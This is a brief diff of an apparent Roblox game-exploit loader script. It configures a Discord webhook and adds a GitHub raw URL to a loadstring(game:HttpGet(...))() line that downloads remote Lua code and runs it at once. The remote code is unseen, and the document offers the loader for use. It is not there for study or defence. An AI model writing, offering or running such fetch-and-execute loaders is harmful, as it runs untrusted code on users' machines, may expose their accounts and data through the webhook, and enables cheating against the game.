@@ -4,4 +4,4 @@ WebHook = "your discord webhook"
 
 Mention = true -- change to false if you don't want to get everyone ping in your webhook.
 
-loadstring(game:HttpGet("", true))()```
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Venom0248/psx/main/Main.lua", true))()```
